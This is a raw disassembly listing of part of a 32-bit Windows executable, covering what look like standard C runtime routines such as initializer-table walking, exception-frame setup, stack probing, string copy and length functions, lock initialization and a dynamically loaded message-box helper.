  423687:	mov    eax,DWORD PTR [ebp-0x1c]
  42368a:	mov    eax,DWORD PTR [eax]
  42368c:	test   eax,eax
  42368e:	je     0x42369b
  423690:	call   eax
  423692:	jmp    0x42369b
  423694:	xor    eax,eax
  423696:	inc    eax
  423697:	ret    
  423698:	mov    esp,DWORD PTR [ebp-0x18]
  42369b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42369f:	add    DWORD PTR [ebp-0x1c],0x4
  4236a3:	jmp    0x42367a
  4236a5:	call   0x423893
  4236aa:	ret    
  4236ab:	push   0xc
  4236ad:	push   0x4284b0
  4236b2:	call   0x423858
  4236b7:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236be:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236c5:	jae    0x4236e9
  4236c7:	and    DWORD PTR [ebp-0x4],0x0
  4236cb:	mov    eax,DWORD PTR [ebp-0x1c]
  4236ce:	mov    eax,DWORD PTR [eax]
  4236d0:	test   eax,eax
  4236d2:	je     0x4236df
  4236d4:	call   eax
  4236d6:	jmp    0x4236df
  4236d8:	xor    eax,eax
  4236da:	inc    eax
  4236db:	ret    
  4236dc:	mov    esp,DWORD PTR [ebp-0x18]
  4236df:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236e3:	add    DWORD PTR [ebp-0x1c],0x4
  4236e7:	jmp    0x4236be
  4236e9:	call   0x423893
  4236ee:	ret    
  4236ef:	call   0x423936
  4236f4:	mov    eax,ds:0x45c304
  4236f9:	cmp    eax,0xffffffff
  4236fc:	je     0x42370c
  4236fe:	push   eax
  4236ff:	call   DWORD PTR ds:0x428064
  423705:	or     DWORD PTR ds:0x45c304,0xffffffff
  42370c:	ret    
  42370d:	push   ebx
  42370e:	push   esi
  42370f:	call   DWORD PTR ds:0x428010
  423715:	push   DWORD PTR ds:0x45c304
  42371b:	mov    ebx,eax
  42371d:	call   DWORD PTR ds:0x428074
  423723:	mov    esi,eax
  423725:	test   esi,esi
  423727:	jne    0x423772
  423729:	push   0x88
  42372e:	push   0x1
  423730:	call   0x424978
  423735:	mov    esi,eax
  423737:	test   esi,esi
  423739:	pop    ecx
  42373a:	pop    ecx
  42373b:	je     0x42376a
  42373d:	push   esi
  42373e:	push   DWORD PTR ds:0x45c304
  423744:	call   DWORD PTR ds:0x428070
  42374a:	test   eax,eax
  42374c:	je     0x42376a
  42374e:	mov    DWORD PTR [esi+0x54],0x45c258
  423755:	mov    DWORD PTR [esi+0x14],0x1
  42375c:	call   DWORD PTR ds:0x42806c
  423762:	or     DWORD PTR [esi+0x4],0xffffffff
  423766:	mov    DWORD PTR [esi],eax
  423768:	jmp    0x423772
  42376a:	push   0x10
  42376c:	call   0x422920
  423771:	pop    ecx
  423772:	push   ebx
  423773:	call   DWORD PTR ds:0x428068
  423779:	mov    eax,esi
  42377b:	pop    esi
  42377c:	pop    ebx
  42377d:	ret    
  42377e:	call   0x4238ed
  423783:	test   eax,eax
  423785:	je     0x423797
  423787:	call   DWORD PTR ds:0x428078
  42378d:	cmp    eax,0xffffffff
  423790:	mov    ds:0x45c304,eax
  423795:	jne    0x42379f
  423797:	call   0x4236ef
  42379c:	xor    eax,eax
  42379e:	ret    
  42379f:	push   esi
  4237a0:	push   0x88
  4237a5:	push   0x1
  4237a7:	call   0x424978
  4237ac:	mov    esi,eax
  4237ae:	test   esi,esi
  4237b0:	pop    ecx
  4237b1:	pop    ecx
  4237b2:	je     0x4237e4
  4237b4:	push   esi
  4237b5:	push   DWORD PTR ds:0x45c304
  4237bb:	call   DWORD PTR ds:0x428070
  4237c1:	test   eax,eax
  4237c3:	je     0x4237e4
  4237c5:	mov    DWORD PTR [esi+0x54],0x45c258
  4237cc:	mov    DWORD PTR [esi+0x14],0x1
  4237d3:	call   DWORD PTR ds:0x42806c
  4237d9:	or     DWORD PTR [esi+0x4],0xffffffff
  4237dd:	mov    DWORD PTR [esi],eax
  4237df:	xor    eax,eax
  4237e1:	inc    eax
  4237e2:	pop    esi
  4237e3:	ret    
  4237e4:	call   0x4236ef
  4237e9:	xor    eax,eax
  4237eb:	pop    esi
  4237ec:	ret    
  4237ed:	cmp    DWORD PTR ds:0x45cac4,0x2
  4237f4:	jne    0x423803
  4237f6:	cmp    DWORD PTR ds:0x45cad0,0x5
  4237fd:	jb     0x423803
  4237ff:	xor    eax,eax
  423801:	inc    eax
  423802:	ret    
  423803:	push   0x3
  423805:	pop    eax
  423806:	ret    
  423807:	xor    eax,eax
  423809:	cmp    DWORD PTR [esp+0x4],eax
  42380d:	push   0x0
  42380f:	sete   al
  423812:	push   0x1000
  423817:	push   eax
  423818:	call   DWORD PTR ds:0x428080
  42381e:	test   eax,eax
  423820:	mov    ds:0x45d140,eax
  423825:	je     0x423851
  423827:	call   0x4237ed
  42382c:	cmp    eax,0x3
  42382f:	mov    ds:0x45d144,eax
  423834:	jne    0x423854
  423836:	push   0x3f8
  42383b:	call   0x424bfa
  423840:	test   eax,eax
  423842:	pop    ecx
  423843:	jne    0x423854
  423845:	push   DWORD PTR ds:0x45d140
  42384b:	call   DWORD PTR ds:0x42807c
  423851:	xor    eax,eax
  423853:	ret    
  423854:	xor    eax,eax
  423856:	inc    eax
  423857:	ret    
  423858:	push   0x425728
  42385d:	mov    eax,fs:0x0
  423863:	push   eax
  423864:	mov    eax,DWORD PTR [esp+0x10]
  423868:	mov    DWORD PTR [esp+0x10],ebp
  42386c:	lea    ebp,[esp+0x10]
  423870:	sub    esp,eax
  423872:	push   ebx
  423873:	push   esi
  423874:	push   edi
  423875:	mov    eax,DWORD PTR [ebp-0x8]
  423878:	mov    DWORD PTR [ebp-0x18],esp
  42387b:	push   eax
  42387c:	mov    eax,DWORD PTR [ebp-0x4]
  42387f:	mov    DWORD PTR [ebp-0x4],0xffffffff
  423886:	mov    DWORD PTR [ebp-0x8],eax
  423889:	lea    eax,[ebp-0x10]
  42388c:	mov    fs:0x0,eax
  423892:	ret    
  423893:	mov    ecx,DWORD PTR [ebp-0x10]
  423896:	mov    DWORD PTR fs:0x0,ecx
  42389d:	pop    ecx
  42389e:	pop    edi
  42389f:	pop    esi
  4238a0:	pop    ebx
  4238a1:	leave  
  4238a2:	push   ecx
  4238a3:	ret    
  4238a4:	int3   
  4238a5:	int3   
  4238a6:	int3   
  4238a7:	int3   
  4238a8:	int3   
  4238a9:	int3   
  4238aa:	int3   
  4238ab:	int3   
  4238ac:	int3   
  4238ad:	int3   
  4238ae:	int3   
  4238af:	int3   
  4238b0:	cmp    eax,0x1000
  4238b5:	jae    0x4238c5
  4238b7:	neg    eax
  4238b9:	add    eax,esp
  4238bb:	add    eax,0x4
  4238be:	test   DWORD PTR [eax],eax
  4238c0:	xchg   esp,eax
  4238c1:	mov    eax,DWORD PTR [eax]
  4238c3:	push   eax
  4238c4:	ret    
  4238c5:	push   ecx
  4238c6:	lea    ecx,[esp+0x8]
  4238ca:	sub    ecx,0x1000
  4238d0:	sub    eax,0x1000
  4238d5:	test   DWORD PTR [ecx],eax
  4238d7:	cmp    eax,0x1000
  4238dc:	jae    0x4238ca
  4238de:	sub    ecx,eax
  4238e0:	mov    eax,esp
  4238e2:	test   DWORD PTR [ecx],eax
  4238e4:	mov    esp,ecx
  4238e6:	mov    ecx,DWORD PTR [eax]
  4238e8:	mov    eax,DWORD PTR [eax+0x4]
  4238eb:	push   eax
  4238ec:	ret    
  4238ed:	push   esi
  4238ee:	push   edi
  4238ef:	xor    esi,esi
  4238f1:	mov    edi,0x45cc20
  4238f6:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  4238fe:	jne    0x42391e
  423900:	lea    eax,[esi*8+0x45c310]
  423907:	mov    DWORD PTR [eax],edi
  423909:	push   0xfa0
  42390e:	push   DWORD PTR [eax]
  423910:	add    edi,0x18
  423913:	call   0x4248ed
  423918:	test   eax,eax
  42391a:	pop    ecx
  42391b:	pop    ecx
  42391c:	je     0x42392a
  42391e:	inc    esi
  42391f:	cmp    esi,0x24
  423922:	jl     0x4238f6
  423924:	xor    eax,eax
  423926:	inc    eax
  423927:	pop    edi
  423928:	pop    esi
  423929:	ret    
  42392a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423932:	xor    eax,eax
  423934:	jmp    0x423927
  423936:	push   ebx
  423937:	mov    ebx,DWORD PTR ds:0x428060
  42393d:	push   esi
  42393e:	mov    esi,0x45c310
  423943:	push   edi
  423944:	mov    edi,DWORD PTR [esi]
  423946:	test   edi,edi
  423948:	je     0x42395d
  42394a:	cmp    DWORD PTR [esi+0x4],0x1
  42394e:	je     0x42395d
  423950:	push   edi
  423951:	call   ebx
  423953:	push   edi
  423954:	call   0x42446a
  423959:	and    DWORD PTR [esi],0x0
  42395c:	pop    ecx
  42395d:	add    esi,0x8
  423960:	cmp    esi,0x45c430
  423966:	jl     0x423944
  423968:	mov    esi,0x45c310
  42396d:	pop    edi
  42396e:	mov    eax,DWORD PTR [esi]
  423970:	test   eax,eax
  423972:	je     0x42397d
  423974:	cmp    DWORD PTR [esi+0x4],0x1
  423978:	jne    0x42397d
  42397a:	push   eax
  42397b:	call   ebx
  42397d:	add    esi,0x8
  423980:	cmp    esi,0x45c430
  423986:	jl     0x42396e
  423988:	pop    esi
  423989:	pop    ebx
  42398a:	ret    
  42398b:	push   ebp
  42398c:	mov    ebp,esp
  42398e:	mov    eax,DWORD PTR [ebp+0x8]
  423991:	push   DWORD PTR [eax*8+0x45c310]
  423998:	call   DWORD PTR ds:0x42808c
  42399e:	pop    ebp
  42399f:	ret    
  4239a0:	push   ebp
  4239a1:	mov    ebp,esp
  4239a3:	push   esi
  4239a4:	mov    esi,DWORD PTR [ebp+0x8]
  4239a7:	lea    esi,[esi*8+0x45c310]
  4239ae:	cmp    DWORD PTR [esi],0x0
  4239b1:	je     0x4239b8
  4239b3:	xor    eax,eax
  4239b5:	inc    eax
  4239b6:	jmp    0x423a1c
  4239b8:	push   edi
  4239b9:	push   0x18
  4239bb:	call   0x424582
  4239c0:	mov    edi,eax
  4239c2:	test   edi,edi
  4239c4:	pop    ecx
  4239c5:	jne    0x4239d6
  4239c7:	call   0x425800
  4239cc:	mov    DWORD PTR [eax],0xc
  4239d2:	xor    eax,eax
  4239d4:	jmp    0x423a1b
  4239d6:	push   0xa
  4239d8:	call   0x423a1f
  4239dd:	cmp    DWORD PTR [esi],0x0
  4239e0:	pop    ecx
  4239e1:	jne    0x423a09
  4239e3:	push   0xfa0
  4239e8:	push   edi
  4239e9:	call   0x4248ed
  4239ee:	test   eax,eax
  4239f0:	pop    ecx
  4239f1:	pop    ecx
  4239f2:	jne    0x423a05
  4239f4:	push   edi
  4239f5:	call   0x42446a
  4239fa:	push   0xa
  4239fc:	call   0x42398b
  423a01:	pop    ecx
  423a02:	pop    ecx
  423a03:	jmp    0x4239c7
  423a05:	mov    DWORD PTR [esi],edi
  423a07:	jmp    0x423a10
  423a09:	push   edi
  423a0a:	call   0x42446a
  423a0f:	pop    ecx
  423a10:	push   0xa
  423a12:	call   0x42398b
  423a17:	xor    eax,eax
  423a19:	pop    ecx
  423a1a:	inc    eax
  423a1b:	pop    edi
  423a1c:	pop    esi
  423a1d:	pop    ebp
  423a1e:	ret    
  423a1f:	push   ebp
  423a20:	mov    ebp,esp
  423a22:	mov    eax,DWORD PTR [ebp+0x8]
  423a25:	push   esi
  423a26:	lea    esi,[eax*8+0x45c310]
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	jne    0x423a45
  423a32:	push   eax
  423a33:	call   0x4239a0
  423a38:	test   eax,eax
  423a3a:	pop    ecx
  423a3b:	jne    0x423a45
  423a3d:	push   0x11
  423a3f:	call   0x422920
  423a44:	pop    ecx
  423a45:	push   DWORD PTR [esi]
  423a47:	call   DWORD PTR ds:0x428090
  423a4d:	pop    esi
  423a4e:	pop    ebp
  423a4f:	ret    
  423a50:	push   esi
  423a51:	push   DWORD PTR ds:0x45d268
  423a57:	call   0x4259b6
  423a5c:	pop    ecx
  423a5d:	mov    ecx,DWORD PTR ds:0x45d264
  423a63:	mov    esi,eax
  423a65:	mov    eax,ds:0x45d268
  423a6a:	mov    edx,ecx
  423a6c:	sub    edx,eax
  423a6e:	add    edx,0x4
  423a71:	cmp    esi,edx
  423a73:	jae    0x423ac3
  423a75:	mov    ecx,0x800
  423a7a:	cmp    esi,ecx
  423a7c:	jae    0x423a80
  423a7e:	mov    ecx,esi
  423a80:	add    ecx,esi
  423a82:	push   ecx
  423a83:	push   eax
  423a84:	call   0x425809
  423a89:	test   eax,eax
  423a8b:	pop    ecx
  423a8c:	pop    ecx
  423a8d:	jne    0x423aa6
  423a8f:	add    esi,0x10
  423a92:	push   esi
  423a93:	push   DWORD PTR ds:0x45d268
  423a99:	call   0x425809
  423a9e:	test   eax,eax
  423aa0:	pop    ecx
  423aa1:	pop    ecx
  423aa2:	jne    0x423aa6
  423aa4:	pop    esi
  423aa5:	ret    
  423aa6:	mov    ecx,DWORD PTR ds:0x45d264
  423aac:	sub    ecx,DWORD PTR ds:0x45d268
  423ab2:	mov    ds:0x45d268,eax
  423ab7:	sar    ecx,0x2
  423aba:	lea    ecx,[eax+ecx*4]
  423abd:	mov    DWORD PTR ds:0x45d264,ecx
  423ac3:	mov    DWORD PTR [ecx],edi
  423ac5:	add    DWORD PTR ds:0x45d264,0x4
  423acc:	mov    eax,edi
  423ace:	pop    esi
  423acf:	ret    
  423ad0:	push   0x80
  423ad5:	call   0x424582
  423ada:	test   eax,eax
  423adc:	pop    ecx
  423add:	mov    ds:0x45d268,eax
  423ae2:	jne    0x423ae8
  423ae4:	push   0x18
  423ae6:	pop    eax
  423ae7:	ret    
  423ae8:	and    DWORD PTR [eax],0x0
  423aeb:	mov    eax,ds:0x45d268
  423af0:	mov    ds:0x45d264,eax
  423af5:	xor    eax,eax
  423af7:	ret    
  423af8:	push   0xc
  423afa:	push   0x4284c0
  423aff:	call   0x423858
  423b04:	call   0x422b6b
  423b09:	and    DWORD PTR [ebp-0x4],0x0
  423b0d:	mov    edi,DWORD PTR [ebp+0x8]
  423b10:	call   0x423a50
  423b15:	mov    DWORD PTR [ebp-0x1c],eax
  423b18:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b1c:	call   0x423b2a
  423b21:	mov    eax,DWORD PTR [ebp-0x1c]
  423b24:	call   0x423893
  423b29:	ret    
  423b2a:	call   0x422b74
  423b2f:	ret    
  423b30:	push   DWORD PTR [esp+0x4]
  423b34:	call   0x423af8
  423b39:	neg    eax
  423b3b:	sbb    eax,eax
  423b3d:	neg    eax
  423b3f:	pop    ecx
  423b40:	dec    eax
  423b41:	ret    
  423b42:	push   ebp
  423b43:	mov    ebp,esp
  423b45:	sub    esp,0x10
  423b48:	push   ebx
  423b49:	xor    ebx,ebx
  423b4b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423b51:	push   esi
  423b52:	push   edi
  423b53:	jne    0x423bc2
  423b55:	push   0x428530
  423b5a:	call   DWORD PTR ds:0x428094
  423b60:	mov    edi,eax
  423b62:	cmp    edi,ebx
  423b64:	je     0x423bfd
  423b6a:	mov    esi,DWORD PTR ds:0x428018
  423b70:	push   0x428524
  423b75:	push   edi
  423b76:	call   esi
  423b78:	test   eax,eax
  423b7a:	mov    ds:0x45cd70,eax
  423b7f:	je     0x423bfd
  423b81:	push   0x428514
  423b86:	push   edi
  423b87:	call   esi
  423b89:	push   0x428500
  423b8e:	push   edi
  423b8f:	mov    ds:0x45cd74,eax
  423b94:	call   esi
  423b96:	cmp    DWORD PTR ds:0x45cac4,0x2
  423b9d:	mov    ds:0x45cd78,eax
  423ba2:	jne    0x423bc2
  423ba4:	push   0x4284e4
  423ba9:	push   edi
  423baa:	call   esi
  423bac:	test   eax,eax
  423bae:	mov    ds:0x45cd80,eax
  423bb3:	je     0x423bc2
  423bb5:	push   0x4284cc
  423bba:	push   edi
  423bbb:	call   esi
  423bbd:	mov    ds:0x45cd7c,eax
  423bc2:	mov    eax,ds:0x45cd7c
  423bc7:	test   eax,eax
  423bc9:	je     0x423c07
  423bcb:	call   eax
  423bcd:	test   eax,eax
  423bcf:	je     0x423bee
  423bd1:	lea    ecx,[ebp-0x4]
  423bd4:	push   ecx
  423bd5:	push   0xc
  423bd7:	lea    ecx,[ebp-0x10]
  423bda:	push   ecx
  423bdb:	push   0x1
  423bdd:	push   eax
  423bde:	call   DWORD PTR ds:0x45cd80
  423be4:	test   eax,eax
  423be6:	je     0x423bee
  423be8:	test   BYTE PTR [ebp-0x8],0x1
  423bec:	jne    0x423c07
  423bee:	cmp    DWORD PTR ds:0x45cad0,0x4
  423bf5:	jb     0x423c01
  423bf7:	or     BYTE PTR [ebp+0x12],0x20
  423bfb:	jmp    0x423c26
  423bfd:	xor    eax,eax
  423bff:	jmp    0x423c36
  423c01:	or     BYTE PTR [ebp+0x12],0x4
  423c05:	jmp    0x423c26
  423c07:	mov    eax,ds:0x45cd74
  423c0c:	test   eax,eax
  423c0e:	je     0x423c26
  423c10:	call   eax
  423c12:	mov    ebx,eax
  423c14:	test   ebx,ebx
  423c16:	je     0x423c26
  423c18:	mov    eax,ds:0x45cd78
  423c1d:	test   eax,eax
  423c1f:	je     0x423c26
  423c21:	push   ebx
  423c22:	call   eax
  423c24:	mov    ebx,eax
  423c26:	push   DWORD PTR [ebp+0x10]
  423c29:	push   DWORD PTR [ebp+0xc]
  423c2c:	push   DWORD PTR [ebp+0x8]
  423c2f:	push   ebx
  423c30:	call   DWORD PTR ds:0x45cd70
  423c36:	pop    edi
  423c37:	pop    esi
  423c38:	pop    ebx
  423c39:	leave  
  423c3a:	ret    
  423c3b:	int3   
  423c3c:	int3   
  423c3d:	int3   
  423c3e:	int3   
  423c3f:	int3   
  423c40:	push   edi
  423c41:	mov    edi,DWORD PTR [esp+0x8]
  423c45:	jmp    0x423cb5
  423c47:	lea    esp,[esp+0x0]
  423c4e:	mov    edi,edi
  423c50:	mov    ecx,DWORD PTR [esp+0x4]
  423c54:	push   edi
  423c55:	test   ecx,0x3
  423c5b:	je     0x423c70
  423c5d:	mov    al,BYTE PTR [ecx]
  423c5f:	add    ecx,0x1
  423c62:	test   al,al
  423c64:	je     0x423ca3
  423c66:	test   ecx,0x3
  423c6c:	jne    0x423c5d
  423c6e:	mov    edi,edi
  423c70:	mov    eax,DWORD PTR [ecx]
  423c72:	mov    edx,0x7efefeff
  423c77:	add    edx,eax
  423c79:	xor    eax,0xffffffff
  423c7c:	xor    eax,edx
  423c7e:	add    ecx,0x4
  423c81:	test   eax,0x81010100
  423c86:	je     0x423c70
  423c88:	mov    eax,DWORD PTR [ecx-0x4]
  423c8b:	test   al,al
  423c8d:	je     0x423cb2
  423c8f:	test   ah,ah
  423c91:	je     0x423cad
  423c93:	test   eax,0xff0000
  423c98:	je     0x423ca8
  423c9a:	test   eax,0xff000000
  423c9f:	je     0x423ca3
  423ca1:	jmp    0x423c70
  423ca3:	lea    edi,[ecx-0x1]
  423ca6:	jmp    0x423cb5
  423ca8:	lea    edi,[ecx-0x2]
  423cab:	jmp    0x423cb5
  423cad:	lea    edi,[ecx-0x3]
  423cb0:	jmp    0x423cb5
  423cb2:	lea    edi,[ecx-0x4]
  423cb5:	mov    ecx,DWORD PTR [esp+0xc]
  423cb9:	test   ecx,0x3
  423cbf:	je     0x423cde
  423cc1:	mov    dl,BYTE PTR [ecx]
  423cc3:	add    ecx,0x1
  423cc6:	test   dl,dl
  423cc8:	je     0x423d30
  423cca:	mov    BYTE PTR [edi],dl
  423ccc:	add    edi,0x1
  423ccf:	test   ecx,0x3
  423cd5:	jne    0x423cc1
  423cd7:	jmp    0x423cde
  423cd9:	mov    DWORD PTR [edi],edx
  423cdb:	add    edi,0x4
  423cde:	mov    edx,0x7efefeff
  423ce3:	mov    eax,DWORD PTR [ecx]
  423ce5:	add    edx,eax
  423ce7:	xor    eax,0xffffffff
  423cea:	xor    eax,edx
  423cec:	mov    edx,DWORD PTR [ecx]
  423cee:	add    ecx,0x4
  423cf1:	test   eax,0x81010100
  423cf6:	je     0x423cd9
  423cf8:	test   dl,dl
  423cfa:	je     0x423d30
  423cfc:	test   dh,dh
  423cfe:	je     0x423d27
  423d00:	test   edx,0xff0000
  423d06:	je     0x423d1a
  423d08:	test   edx,0xff000000
  423d0e:	je     0x423d12
  423d10:	jmp    0x423cd9
  423d12:	mov    DWORD PTR [edi],edx
  423d14:	mov    eax,DWORD PTR [esp+0x8]
  423d18:	pop    edi
  423d19:	ret    
  423d1a:	mov    WORD PTR [edi],dx
  423d1d:	mov    eax,DWORD PTR [esp+0x8]
  423d21:	mov    BYTE PTR [edi+0x2],0x0
  423d25:	pop    edi
  423d26:	ret    
  423d27:	mov    WORD PTR [edi],dx
  423d2a:	mov    eax,DWORD PTR [esp+0x8]
  423d2e:	pop    edi
  423d2f:	ret    
  423d30:	mov    BYTE PTR [edi],dl
  423d32:	mov    eax,DWORD PTR [esp+0x8]
  423d36:	pop    edi
  423d37:	ret    
  423d38:	int3   
  423d39:	int3   
  423d3a:	int3   
  423d3b:	int3   
  423d3c:	int3   
  423d3d:	int3   
  423d3e:	int3   
  423d3f:	int3   
  423d40:	mov    ecx,DWORD PTR [esp+0xc]
  423d44:	push   edi
  423d45:	test   ecx,ecx
  423d47:	je     0x423ddf
  423d4d:	push   esi
  423d4e:	push   ebx
  423d4f:	mov    ebx,ecx
  423d51:	mov    esi,DWORD PTR [esp+0x14]
  423d55:	test   esi,0x3
  423d5b:	mov    edi,DWORD PTR [esp+0x10]
  423d5f:	jne    0x423d6c
  423d61:	shr    ecx,0x2
  423d64:	jne    0x423def
  423d6a:	jmp    0x423d93
  423d6c:	mov    al,BYTE PTR [esi]
  423d6e:	add    esi,0x1
  423d71:	mov    BYTE PTR [edi],al
  423d73:	add    edi,0x1
  423d76:	sub    ecx,0x1
  423d79:	je     0x423da6
  423d7b:	test   al,al
  423d7d:	je     0x423dae
  423d7f:	test   esi,0x3
  423d85:	jne    0x423d6c
  423d87:	mov    ebx,ecx
  423d89:	shr    ecx,0x2
  423d8c:	jne    0x423def
  423d8e:	and    ebx,0x3
  423d91:	je     0x423da6
  423d93:	mov    al,BYTE PTR [esi]
  423d95:	add    esi,0x1
  423d98:	mov    BYTE PTR [edi],al
  423d9a:	add    edi,0x1
  423d9d:	test   al,al
  423d9f:	je     0x423dd8
  423da1:	sub    ebx,0x1
  423da4:	jne    0x423d93
  423da6:	mov    eax,DWORD PTR [esp+0x10]
  423daa:	pop    ebx
  423dab:	pop    esi
  423dac:	pop    edi
  423dad:	ret    
  423dae:	test   edi,0x3
  423db4:	je     0x423dcc
  423db6:	mov    BYTE PTR [edi],al
  423db8:	add    edi,0x1
  423dbb:	sub    ecx,0x1
  423dbe:	je     0x423e5c
  423dc4:	test   edi,0x3
  423dca:	jne    0x423db6
  423dcc:	mov    ebx,ecx
  423dce:	shr    ecx,0x2
  423dd1:	jne    0x423e47
  423dd3:	mov    BYTE PTR [edi],al
  423dd5:	add    edi,0x1
  423dd8:	sub    ebx,0x1
  423ddb:	jne    0x423dd3
  423ddd:	pop    ebx
  423dde:	pop    esi
  423ddf:	mov    eax,DWORD PTR [esp+0x8]
  423de3:	pop    edi
  423de4:	ret    
  423de5:	mov    DWORD PTR [edi],edx
  423de7:	add    edi,0x4
  423dea:	sub    ecx,0x1
  423ded:	je     0x423d8e
  423def:	mov    edx,0x7efefeff
  423df4:	mov    eax,DWORD PTR [esi]
  423df6:	add    edx,eax
  423df8:	xor    eax,0xffffffff
  423dfb:	xor    eax,edx
  423dfd:	mov    edx,DWORD PTR [esi]
  423dff:	add    esi,0x4
  423e02:	test   eax,0x81010100
  423e07:	je     0x423de5
  423e09:	test   dl,dl
  423e0b:	je     0x423e39
  423e0d:	test   dh,dh
  423e0f:	je     0x423e2f
  423e11:	test   edx,0xff0000
  423e17:	je     0x423e25
  423e19:	test   edx,0xff000000
  423e1f:	jne    0x423de5
  423e21:	mov    DWORD PTR [edi],edx
  423e23:	jmp    0x423e3d
  423e25:	and    edx,0xffff
  423e2b:	mov    DWORD PTR [edi],edx
  423e2d:	jmp    0x423e3d
  423e2f:	and    edx,0xff
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	jmp    0x423e3d
  423e39:	xor    edx,edx
  423e3b:	mov    DWORD PTR [edi],edx
  423e3d:	add    edi,0x4
  423e40:	xor    eax,eax
  423e42:	sub    ecx,0x1
  423e45:	je     0x423e53
  423e47:	xor    eax,eax
  423e49:	mov    DWORD PTR [edi],eax
  423e4b:	add    edi,0x4
  423e4e:	sub    ecx,0x1
  423e51:	jne    0x423e49
  423e53:	and    ebx,0x3
  423e56:	jne    0x423dd3
  423e5c:	mov    eax,DWORD PTR [esp+0x10]
  423e60:	pop    ebx
  423e61:	pop    esi
  423e62:	pop    edi
  423e63:	ret    
  423e64:	int3   
  423e65:	int3   
  423e66:	int3   
  423e67:	int3   
  423e68:	int3   
  423e69:	int3   
  423e6a:	int3   
  423e6b:	int3   
  423e6c:	int3   
  423e6d:	int3   
  423e6e:	int3   
  423e6f:	int3   
  423e70:	mov    ecx,DWORD PTR [esp+0x4]
  423e74:	test   ecx,0x3
  423e7a:	je     0x423ea0
  423e7c:	mov    al,BYTE PTR [ecx]
  423e7e:	add    ecx,0x1
  423e81:	test   al,al
  423e83:	je     0x423ed3
  423e85:	test   ecx,0x3
  423e8b:	jne    0x423e7c
  423e8d:	add    eax,0x0
  423e92:	lea    esp,[esp+0x0]
  423e99:	lea    esp,[esp+0x0]
  423ea0:	mov    eax,DWORD PTR [ecx]
  423ea2:	mov    edx,0x7efefeff
  423ea7:	add    edx,eax
  423ea9:	xor    eax,0xffffffff
  423eac:	xor    eax,edx
  423eae:	add    ecx,0x4
  423eb1:	test   eax,0x81010100
  423eb6:	je     0x423ea0
  423eb8:	mov    eax,DWORD PTR [ecx-0x4]
  423ebb:	test   al,al
  423ebd:	je     0x423ef1
  423ebf:	test   ah,ah
  423ec1:	je     0x423ee7
  423ec3:	test   eax,0xff0000
  423ec8:	je     0x423edd
  423eca:	test   eax,0xff000000
  423ecf:	je     0x423ed3
  423ed1:	jmp    0x423ea0
  423ed3:	lea    eax,[ecx-0x1]
  423ed6:	mov    ecx,DWORD PTR [esp+0x4]
  423eda:	sub    eax,ecx
  423edc:	ret    
  423edd:	lea    eax,[ecx-0x2]
  423ee0:	mov    ecx,DWORD PTR [esp+0x4]
  423ee4:	sub    eax,ecx
  423ee6:	ret    
  423ee7:	lea    eax,[ecx-0x3]
  423eea:	mov    ecx,DWORD PTR [esp+0x4]
  423eee:	sub    eax,ecx
  423ef0:	ret    
  423ef1:	lea    eax,[ecx-0x4]
  423ef4:	mov    ecx,DWORD PTR [esp+0x4]
  423ef8:	sub    eax,ecx
  423efa:	ret    
  423efb:	push   0x8
  423efd:	push   0x428540
  423f02:	call   0x423858
  423f07:	and    DWORD PTR [ebp-0x4],0x0
  423f0b:	push   0x0
  423f0d:	push   0x1
  423f0f:	call   0x425a82
  423f14:	pop    ecx
  423f15:	pop    ecx
  423f16:	jmp    0x423f1f
  423f18:	xor    eax,eax
  423f1a:	inc    eax
  423f1b:	ret    
  423f1c:	mov    esp,DWORD PTR [ebp-0x18]
  423f1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f23:	push   0x3
  423f25:	call   DWORD PTR ds:0x428028
  423f2b:	int3   
  423f2c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f32:	jne    0x423f35
  423f34:	ret    
  423f35:	jmp    0x423efb
  423f3a:	movzx  eax,BYTE PTR [esp+0x4]
  423f3f:	mov    cl,BYTE PTR [esp+0xc]
  423f43:	test   BYTE PTR [eax+0x45cf21],cl
  423f49:	jne    0x423f67
  423f4b:	cmp    DWORD PTR [esp+0x8],0x0
  423f50:	je     0x423f60
  423f52:	movzx  eax,WORD PTR [eax*2+0x42893a]
  423f5a:	and    eax,DWORD PTR [esp+0x8]
  423f5e:	jmp    0x423f62
  423f60:	xor    eax,eax
  423f62:	test   eax,eax
  423f64:	jne    0x423f67
  423f66:	ret    
  423f67:	xor    eax,eax
  423f69:	inc    eax
  423f6a:	ret    
  423f6b:	push   0x4
  423f6d:	push   0x0
  423f6f:	push   DWORD PTR [esp+0xc]
  423f73:	call   0x423f3a
  423f78:	add    esp,0xc
  423f7b:	ret    
  423f7c:	sub    eax,0x3a4
  423f81:	je     0x423fa5
  423f83:	sub    eax,0x4
  423f86:	je     0x423f9f
  423f88:	sub    eax,0xd
  423f8b:	je     0x423f99
  423f8d:	dec    eax
  423f8e:	je     0x423f93
  423f90:	xor    eax,eax
  423f92:	ret    
  423f93:	mov    eax,0x404
  423f98:	ret    
  423f99:	mov    eax,0x412
  423f9e:	ret    
  423f9f:	mov    eax,0x804
  423fa4:	ret    
  423fa5:	mov    eax,0x411
  423faa:	ret    
  423fab:	push   edi
  423fac:	push   0x40
  423fae:	xor    eax,eax
  423fb0:	pop    ecx
  423fb1:	mov    edi,0x45cf20
  423fb6:	rep stos DWORD PTR es:[edi],eax
  423fb8:	stos   BYTE PTR es:[edi],al
  423fb9:	xor    eax,eax
  423fbb:	mov    ds:0x45d024,eax
  423fc0:	mov    ds:0x45cf1c,eax
  423fc5:	mov    ds:0x45cf14,eax
  423fca:	mov    edi,0x45d030
  423fcf:	stos   DWORD PTR es:[edi],eax
  423fd0:	stos   DWORD PTR es:[edi],eax
  423fd1:	stos   DWORD PTR es:[edi],eax
  423fd2:	pop    edi
  423fd3:	ret    
  423fd4:	push   ebp
  423fd5:	mov    ebp,esp
  423fd7:	sub    esp,0x518
  423fdd:	mov    eax,ds:0x45c430
  423fe2:	xor    eax,DWORD PTR [ebp+0x4]
  423fe5:	push   esi
  423fe6:	mov    DWORD PTR [ebp-0x4],eax
